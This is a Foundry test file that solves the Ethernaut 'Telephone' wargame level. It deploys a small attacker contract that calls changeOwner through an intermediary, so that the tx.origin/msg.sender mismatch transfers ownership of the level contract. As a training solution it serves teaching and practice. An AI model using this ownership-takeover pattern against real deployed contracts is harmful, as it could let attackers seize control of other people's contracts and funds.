// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {TelephoneFactory} from "../src/factories/TelephoneFactory.sol";
import {Telephone} from "../src/levels/Telephone.sol";

import "forge-std/console.sol";

contract TelephoneTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveTelephone() public {
        Telephone instance = Telephone(payable(levelAddress));

        // [START]

        // console.log("msg.sender", msg.sender);
        // console.log("tx.origin", tx.origin);
        console.log("[Before] owner", instance.owner());

        // 1. Deploy attacker contract
        TelephoneAttack attacker = new TelephoneAttack(payable(levelAddress));

        // 2. Call attack function
        attacker.attack();

        // console.log("msg.sender", msg.sender);
        console.log("[After] owner", instance.owner());

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract TelephoneAttack {
    Telephone public target;

    constructor(address _target) {
        target = Telephone(payable(_target));
    }

    function attack() public {
        // console.log("msg.sender", msg.sender);
        // console.log("tx.origin", tx.origin);

        target.changeOwner(msg.sender);
    }
}
